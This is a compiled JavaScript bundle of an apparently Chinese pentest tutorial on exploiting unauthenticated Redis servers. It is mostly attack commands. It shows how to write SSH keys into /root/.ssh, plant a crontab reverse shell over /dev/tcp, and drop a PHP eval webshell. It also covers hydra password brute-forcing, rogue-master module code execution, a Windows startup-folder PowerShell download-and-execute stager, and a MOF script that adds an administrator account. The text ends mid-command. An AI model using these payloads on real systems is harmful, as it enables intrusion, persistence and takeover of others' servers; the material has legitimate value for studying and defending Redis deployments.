(window.webpackJsonp=window.webpackJsonp||[]).push([[87],{846:function(s,a,t){"use strict";t.r(a);var n=t(105),e=Object(n.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h2",{attrs:{id:"redis未授权访问"}},[s._v("Redis未授权访问 "),t("a",{staticClass:"header-anchor",attrs:{href:"#redis未授权访问"}},[s._v("#")])]),s._v(" "),t("p",[t("code",[s._v("Redis")]),s._v(" 默认情况下，会绑定在 "),t("code",[s._v("0.0.0.0:6379")]),s._v("，这样将会将 "),t("code",[s._v("Redis")]),s._v("  服务暴露到公网上")]),s._v(" "),t("p",[s._v("如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis  的数据。")]),s._v(" "),t("p",[s._v("攻击者在未授权访问 "),t("code",[s._v("Redis")]),s._v(" 的情况下可以利用 "),t("code",[s._v("Redis")]),s._v(" 的相关方法，可以成功在 Redis  服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器")]),s._v(" "),t("h3",{attrs:{id:"利用条件和方法"}},[s._v("利用条件和方法 "),t("a",{staticClass:"header-anchor",attrs:{href:"#利用条件和方法"}},[s._v("#")])]),s._v(" "),t("p",[t("strong",[s._v("条件:")])]),s._v(" "),t("blockquote",[t("ol",[t("li",[t("code",[s._v("redis")]),s._v("服务以root账户运行")]),s._v(" "),t("li",[t("code",[s._v("redis")]),s._v("无密码或弱密码进行认证")]),s._v(" "),t("li",[t("code",[s._v("redis")]),s._v("监听在0.0.0.0公网上")])])]),s._v(" "),t("p",[t("strong",[s._v("方法:")])]),s._v(" "),t("blockquote",[t("ul",[t("li",[s._v("通过 "),t("code",[s._v("Redis")]),s._v(" 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫")]),s._v(" "),t("li",[s._v("上传SSH公钥获得SSH登录权限")]),s._v(" "),t("li",[s._v("通过"),t("code",[s._v("crontab")]),s._v("反弹shell")]),s._v(" "),t("li",[s._v("Web目录下写"),t("code",[s._v("webshell")])]),s._v(" "),t("li",[s._v("slave主从模式利用")])])]),s._v(" "),t("p",[t("strong",[s._v("获取info")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("nmap -A -p "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v(" –script redis-info "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.111\t\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#扫描目标redis info")]),s._v("\n\n./redis-cli -h "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.111\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.111:673"),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("9")]),s._v(">")]),s._v(" info\nkeys *\t\t\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看所有key")]),s._v("\nget key_name\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看key的值，例如get password")]),s._v("\nflushall\t\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#删除所有数据")]),s._v("\ndel key\t\t\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#删除键为key的数据")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br")])]),t("p",[t("strong",[s._v("上传SSH公钥获得SSH登录权限")])]),s._v(" "),t("p",[s._v("原理就是在数据库中插入一条数据，将本机的公钥作为value，(key值随意)")]),s._v(" "),t("p",[s._v("然后通过修改数据库的默认路径为"),t("code",[s._v("/root/.ssh")]),s._v("和默认的缓冲文件"),t("code",[s._v("authorized.keys")])]),s._v(" "),t("p",[s._v("把缓冲的数据保存在文件里，这样就可以在服务器端的"),t("code",[s._v("/root/.ssh")]),s._v("下生一个授权的key")]),s._v(" "),t("p",[s._v("首先在自己的电脑上生成key:")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("ssh-keygen -t rsa\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("将公钥导入"),t("code",[s._v("key.txt")]),s._v("文件（前后用\\n\\n换行，避免和"),t("code",[s._v("Redis")]),s._v("里其他缓存数据混合）,再把"),t("code",[s._v("key.txt")]),s._v("文件内容写入目标主机的缓冲里")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("echo -e "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" id_rsa.pub"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" -e "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" key.txt\n\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" key.txt "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" ./redis-cli -h "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".10.153 -x "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("test")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[s._v("连接目标主机的"),t("code",[s._v("Redis")]),s._v("，设置"),t("code",[s._v("redis")]),s._v("的备份路径为/root/.ssh和保存文件名authorized_keys")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("./redis-cli -h "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.111\nconfig "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" /root/.ssh\nconfig "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" dbfilename authorized_keys\nkeys *\nget "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("test")]),s._v("\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看数据是否存在")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#将（缓存里的数据key.txt）保存在服务器硬盘上")]),s._v("\nsave\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#SSH 连接目标主机，无需密码即可登录")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.111\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#cat /root/.ssh/authorized_keys 可以查看文件内容，是写入的公钥")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br")])]),t("p",[t("strong",[s._v("通过"),t("code",[s._v("crontab")]),s._v("定时任务反弹shell")])]),s._v(" "),t("p",[s._v("原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#首先在客户端这边监听一个端口，端口不要冲突")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" -lv "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("6666")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#连接redis，写入反弹shell")]),s._v("\n./redis-cli -h "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.111\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" test2 "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("*/1 * * * * /bin/bash -i>&/dev/tcp/客户端IP/4444 0>&1"),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('"')]),s._v("\nconfig "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" /var/spool/cron\nconfig "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" dbfilename root\nsave\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br")])]),t("p",[t("strong",[s._v("Web目录写"),t("code",[s._v("WebShell")])])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("./redis-cli -h "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.111\nconfig "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" /var/www/html\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" shell "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("<?php @eval("),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_POST")]),s._v("['wintry']);?>"),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('"')]),s._v("\nconfig "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" dbfilename shell.php\nsave\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("hydra -P passwd.txt redis://192.168.1.111\t\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#可以利用hydra爆破redis密码")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("strong",[s._v("slave主从复制实现ECE")])]),s._v(" "),t("p",[t("strong",[t("code",[s._v("redis")]),s._v("主从复制")])]),s._v(" "),t("p",[s._v("如果当把数据存储在单个"),t("code",[s._v("Redis")]),s._v("的实例中，当读写体量比较大的时候，服务端就很难承受。")]),s._v(" "),t("p",[s._v("为了应对这种情况，"),t("code",[s._v("Redis")]),s._v("就提供了主从模式，主从模式就是指使用一个"),t("code",[s._v("redis")]),s._v("实例作为主机，其他实例都作为备份机")]),s._v(" "),t("p",[s._v("其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式")]),s._v(" "),t("p",[t("strong",[t("code",[s._v("redis")]),s._v("模块")])]),s._v(" "),t("p",[s._v("和"),t("code",[s._v("mysql")]),s._v("类似，"),t("code",[s._v("redis")]),s._v("也支持扩展命令，我们需要编写so文件，来扩展命令。")]),s._v(" "),t("blockquote",[t("p",[s._v("1、我们伪装成redis数据库，然后受害者将我们的数据库设置为主节点。")]),s._v(" "),t("p",[s._v("2、我们设置备份文件名为so文件")]),s._v(" "),t("p",[s._v("3、设置传输方式为全量传输")]),s._v(" "),t("p",[s._v("4、加载so文件，实现任意命令执行")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("./redis-cli -h "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.111\nMODULE LOAD /root/redis-rogue-server/exp.so\nsystem.exec "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"whoami"')]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[s._v("现成的工具，exp利用脚本："),t("a",{attrs:{href:"https://github.com/vulhub/redis-rogue-getshell",target:"_blank",rel:"noopener noreferrer"}},[s._v("redis-rce"),t("OutboundLink")],1)]),s._v(" "),t("p",[t("a",{attrs:{href:"https://blog.csdn.net/ywd1992/article/details/83542955",target:"_blank",rel:"noopener noreferrer"}},[s._v("Redis安装和配置主从复制"),t("OutboundLink")],1)]),s._v(" "),t("h3",{attrs:{id:"windows下的利用"}},[s._v("Windows下的利用 "),t("a",{staticClass:"header-anchor",attrs:{href:"#windows下的利用"}},[s._v("#")])]),s._v(" "),t("p",[t("strong",[s._v("1、知道网站绝对路径，写WebShell")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.9:637"),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("9")]),s._v(">")]),s._v(" config "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" D:/phpstudy_pro/WWW\nOK\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.9:637"),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("9")]),s._v(">")]),s._v(" config "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" dbfilename shell.php\nOK\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.9:637"),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("9")]),s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" x "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"<?php phpinfo();?>"')]),s._v("\nOK\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.9:637"),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("9")]),s._v(">")]),s._v(" save\nOK\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br")])]),t("p",[t("strong",[s._v("2、写入启动项")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#由于Start Menu之间有空格，因此需要用双引号将路径包含")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.9:637"),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("9")]),s._v(">")]),s._v("config "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/"')]),s._v("\nOK\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.9:637"),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("9")]),s._v(">")]),s._v("config "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" dbfilename shell.bat\nOK\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.9:637"),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("9")]),s._v(">")]),s._v("set x “rnrnpowershell.exe -nop -w hidden -c ”IEX "),t("span",{pre:!0,attrs:{class:"token variable"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("((")]),s._v("new"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("object net.webclient"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".downloadstring"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("‘http"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".105")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("a’"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("))")])]),s._v("”rnrn”"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#这是CS用团队服务器生成的马")]),s._v("\nOK\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.9:637"),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("9")]),s._v(">")]),s._v(" save\nOK\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br")])]),t("p",[t("strong",[s._v("3、写入MOF（2003-r2实验未成功）")])]),s._v(" "),t("p",[s._v("由于不能重启机器也无法获取web目录，想到Mof提权，环境限制只能为"),t("strong",[s._v("win2003")])]),s._v(" "),t("blockquote",[t("p",[s._v("mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做 ”托管对象格式”")]),s._v(" "),t("p",[s._v("其作用是每隔五秒就会去监控进程创建和死亡。")]),s._v(" "),t("p",[s._v("就是用了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。")]),s._v(" "),t("p",[s._v("隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。")])]),s._v(" "),t("p",[s._v("也就是说在"),t("code",[s._v("c:/windows/system32/wbem/mof/")]),s._v("目录下的mof文件会每5秒自动执行一次，这样就不需要重启机器就能获取权限了。")]),s._v(" "),t("p",[t("strong",[s._v("保存mof.txt文件，内容如下")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v('#pragma namespace("\\\\.\\root\\subscription")')]),s._v("\ninstance of __EventFilter as "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$EventFilter")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\nEventNamespace "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Root\\Cimv2"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\nName "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"filtP2"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\nQuery "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Select * From __InstanceModificationEvent "')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Where TargetInstance Isa "')]),s._v("Win32_LocalTime"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('" "')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"And TargetInstance.Second = 5"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\nQueryLanguage "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"WQL"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\ninstance of ActiveScriptEventConsumer as "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$Consumer")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\nName "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"consPCSV2"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\nScriptingEngine "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"JScript"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\nScriptText "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"var WSH = new ActiveXObject("')]),s._v("WScript.Shell"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('")nWSH.run("')]),s._v("net.exe user wintrysec admin666 /add"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('")"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\ninstance of __FilterToConsumerBinding\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\nConsumer "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$Consumer")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\nFilter "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$EventFilter")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br")])]),t("p",[s._v("然后执行")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("echo -e "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"nn"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" mof.txt"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token 